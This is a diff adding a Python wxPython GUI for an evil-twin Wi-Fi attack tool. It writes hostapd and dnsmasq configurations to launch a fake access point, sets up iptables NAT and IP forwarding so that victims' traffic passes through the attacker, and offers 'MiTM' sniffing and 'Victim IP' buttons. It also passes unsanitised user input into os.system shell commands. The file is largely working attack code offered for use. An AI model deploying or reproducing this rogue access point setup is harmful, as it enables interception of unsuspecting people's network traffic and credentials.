@@ -1,0 +1,125 @@
+import wx
+import os
+import wless_commands
+import os.path
+
+class SnifferGUI(wx.Frame):
+	def __init__(self, parent, title):
+		super(SnifferGUI, self).__init__(parent, title=title, size=(350,350))
+		
+		self.InitUI()
+		self.Centre()
+		self.Show()
+	
+	def InitUI(self):
+    		
+		panel = wx.Panel(self)
+		#~ panel.SetBackgroundColour('#4f5049')
+		
+		
+		#~ wless_commands.get_monitoring_interfaces()
+		self.APname = wx.TextCtrl(panel, -1, "Enter the name of Fake AP",size=(250,30), pos=(10,20))
+
+		self.nDeviceList = wx.ComboBox(panel, -1, value='Select Attack Interface', size=(200, 30), pos=(10, 115), choices = wless_commands.get_net_devices())
+		
+		self.nDeviceList2 = wx.ComboBox(panel, -1, value='Select Internet Interface', size=(200, 30), pos=(10, 155), choices = wless_commands.get_net_devices())
+		
+		self.actionButton = wx.Button(panel, -1, label='Create Fake AP', pos=(10, 210))
+		self.stopButton = wx.Button(panel, -1, label='Stop Fake AP', pos=(130, 210))
+		
+		self.sniffButton = wx.Button(panel, -1, label='MiTM', pos=(10, 250))
+		self.victimIPButton = wx.Button(panel, -1, label='Victim IP', pos=(130, 250))
+		
+		self.closeButton = wx.Button(panel, -1, label='Close', pos=(250, 250))
+		
+		self.myLabel = wx.StaticText(panel, -1, label='', pos=(10, 180))
+		
+		
+		
+		self.actionButton.Bind(wx.EVT_BUTTON, self.executeCommand)
+		self.stopButton.Bind(wx.EVT_BUTTON, self.stopfakeap)
+		self.closeButton.Bind(wx.EVT_BUTTON, self.closeMe)
+		self.sniffButton.Bind(wx.EVT_BUTTON, self.sniffdata)	
+		self.victimIPButton.Bind(wx.EVT_BUTTON, self.getVictimIPaddress)
+		
+		#~ self.on_timer()
+	def closeMe(self, e):
+		self.Close()
+		
+	def sniffdata(self, e):
+		import MiTM_sniffer
+		MiTM_sniffer.startSniff()
+		
+	
+	def getVictimIPaddress(self,e):
+		import getVictimIP 
+		
+		getVictimIP.startSniff()
+	
+	def stopfakeap(self, e):
+		os.system("kill  `ps aux | grep hostapd | head -1 | awk '{print $2}'`")
+		os.system("kill  `ps aux | grep dnsmasq | head -1 | awk '{print $2}'`")
+		wx.MessageBox('Fake SSID is Stopped', 'Info', wx.OK | wx.ICON_INFORMATION)
+		
+		
+		
+	def executeCommand(self,e):
+		
+		attackInterface = self.nDeviceList.GetValue()
+		internetInterface = self.nDeviceList2.GetValue()
+		fakeAPName = self.APname.GetValue()
+		
+		
+		
+		self.myLabel.SetLabel("Created Fake AP: "+str(fakeAPName))
+		
+				
+		os.system("ifconfig "+internetInterface+" up")
+
+		hostapd = open('./Modules/hostapd-freenet.conf', 'wb')
+		
+		#~ config_file = "interface="+wireless_interface+"\ndriver=nl80211\nssid=thisisme\nchannel=1\n#enable_karma=1\n"
+		config_file = "interface="+attackInterface+"\ndriver=nl80211\nssid="+fakeAPName+"\nchannel=1\n#enable_karma=1\n"
+		hostapd.write(config_file)
+		hostapd.close()
+		#~ print 2
+		os.system("gnome-terminal -x hostapd ./Modules/hostapd-freenet.conf &")
+		#~ print 3
+		os.system("""sed -i 's#^DAEMON_CONF=.*#DAEMON_CONF=/etc/hostapd/hostapd.conf#' /etc/init.d/hostapd
+		cat <<EOF > /etc/dnsmasq.conf
+log-facility=/var/log/dnsmasq.log
+#address=/#/10.0.0.1
+#address=/google.com/10.0.0.1
+interface=%s
+dhcp-range=10.0.0.10,10.0.0.250,12h
+dhcp-option=3,10.0.0.1
+dhcp-option=6,10.0.0.1
+#no-resolv
+log-queries
+EOF"""%attackInterface)
+		os.system("service dnsmasq start")
+
+		os.system("""ifconfig """+attackInterface+""" up
+		ifconfig """+attackInterface+""" 10.0.0.1/24
+		iptables -t nat -F
+		iptables -F
+		iptables -t nat -A POSTROUTING -o """+internetInterface+""" -j MASQUERADE
+		iptables -A FORWARD -i """+attackInterface+""" -o """+internetInterface+""" -j ACCEPT
+		echo '1' > /proc/sys/net/ipv4/ip_forward""")
+		wx.MessageBox(fakeAPName+' SSID is launched', 'Info', wx.OK | wx.ICON_INFORMATION)
+				
+			
+			
+	
+#~ if __name__ == '__main__':
+
+def main():
+	
+	app = wx.App(False)
+	frame = SnifferGUI(None, 'Create Fake AP')
+	app.MainLoop()
+	
+
+
+
+#~ main()
